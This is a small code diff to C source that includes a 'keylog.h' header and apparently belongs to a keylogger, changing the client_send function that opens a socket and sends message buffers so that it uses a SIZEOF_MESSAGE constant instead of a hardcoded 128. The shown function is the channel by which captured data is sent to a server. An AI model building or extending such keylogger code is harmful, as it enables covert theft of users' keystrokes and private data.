@@ -4,7 +4,7 @@
 #include <arpa/inet.h>
 #include "keylog.h"
  
-void client_send(char message[128])
+void client_send(char message[SIZEOF_MESSAGE])
 {
     int socket_desc;
     struct sockaddr_in server;
@@ -25,7 +25,7 @@ void client_send(char message[128])
         return;
     }
     //Send some data
-    if( send(socket_desc , message , 128 , 0) < 0)
+    if( send(socket_desc , message , SIZEOF_MESSAGE , 0) < 0)
     {
         return;
     }     
